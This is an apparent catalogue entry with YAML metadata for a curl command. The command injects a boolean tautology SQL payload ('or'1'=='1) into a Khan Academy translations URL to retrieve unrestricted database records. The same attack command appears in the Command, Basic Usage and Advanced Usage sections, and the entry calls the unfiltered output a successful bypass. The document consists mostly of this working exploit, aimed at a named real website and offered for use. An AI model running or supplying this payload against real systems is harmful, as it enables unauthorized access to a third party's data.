---
data: >-
  curl -s
  "https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv"
tags:
  - sqli
  - exploit
  - web
type: command
output: CSV data from multiple languages or all records
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 900d0976-4524-44d6-b69b-3b9e4aed4a1c
created_at: '2025-12-14T03:46:20.261Z'
updated_at: '2025-12-14T03:46:20.261Z'
verified: false
validated: true
submitted: true
---
# curl-boolean-tautology-sqli

## Command

```bash
curl -s "https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv"
```

## Description

Exploits SQLi with a tautology to retrieve unrestricted database content via GET request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| URL | Endpoint with tautology payload | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv"
```

### Advanced Usage

```bash
curl -s "https://www.khanacademy.org/translations/videos/en'%20or'1'=='1_youtube_stats.csv" | grep -i csv
```

## Expected Output

Unfiltered CSV content, indicating successful bypass.

## Related

- [[Related Procedure: Exploit-SQL-Injection-with-Boolean-Tautology]]
